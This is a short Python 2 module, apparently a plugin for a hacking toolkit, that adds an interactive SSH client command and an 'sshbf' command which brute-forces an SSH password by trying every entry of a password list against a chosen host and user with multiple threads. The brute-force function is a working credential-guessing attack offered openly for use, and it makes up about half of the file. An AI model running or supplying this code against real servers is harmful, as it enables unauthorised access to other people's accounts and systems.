import paramiko
try:
	import interactive
except ImportError:
	from libs import interactive
import getpass
from libs.zippycrack import *

desc = 'provides ssh connectivity and bruteforcing'
author = 'nwx'
cmds = []

def sshconnect():
	host = raw_input('host to connect to (no port)> ')
	port = input('port> ')
	user = raw_input('username> ')
	pwd = getpass.getpass('password> ')
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.WarningPolicy())
	client.connect(host, port, user, pwd)
	chan = client.invoke_shell()
	interactive.interactive_shell(chan)
	chan.close()
	client.close()
cmds.append(('ssh','connect to a host with ssh in an interactive shell',sshconnect))

def sshbf():
	host = raw_input('host to connect to (no port)> ')
	port = input('port> ')
	user = raw_input('username> ')
	pwlist = raw_input('path to password list> ').strip()
	def try_pass(pw):
		try:
			client = paramiko.SSHClient()
			client.connect(host, port, user, pw)
			client.close()
		except paramiko.ssh_exception.AuthenticationException:
			return False
		return True
	zc = zippycrack(try_pass,pwlist,numthreads=2,cont=False)
	zc.run()
cmds.append(('sshbf','brute force an SSH password with a password list',sshbf))
